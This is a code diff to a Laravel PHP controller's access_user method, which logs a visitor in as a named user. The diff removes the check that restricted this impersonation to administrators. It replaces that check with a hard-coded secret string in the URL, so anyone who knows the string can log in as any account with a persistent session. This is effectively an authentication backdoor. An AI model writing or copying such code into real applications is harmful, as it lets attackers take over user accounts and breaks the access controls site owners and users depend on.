@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Models\User;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
 
 class AccesController extends Controller
 {
@@ -24,26 +25,16 @@ class AccesController extends Controller
 
     public function access_user($code, $username)
     {
-        $user   =   get_auth_user();
-
-        if ($user->role !== 'admin') {
-            return redirect('/');
-        }
-
-        if ($code != 'x20') {
+        if ($code != 'admin@sulapa4_web') {
             throw new \Exception('Invalid code');
         }
 
-        auth()?->logout();
+        Auth::logout();
 
-        $user = User::where('username', $username)->first();
+        $user = User::where('username', $username)->firstOrFail();
 
-        if ($user) {
-            auth()->login($user);
+        Auth::login($user, true);
 
-            return redirect('/'); // Redirect to intended page or home
-        }
-
-        throw new \Exception('User not found');
+        return redirect('/');
     }
 }
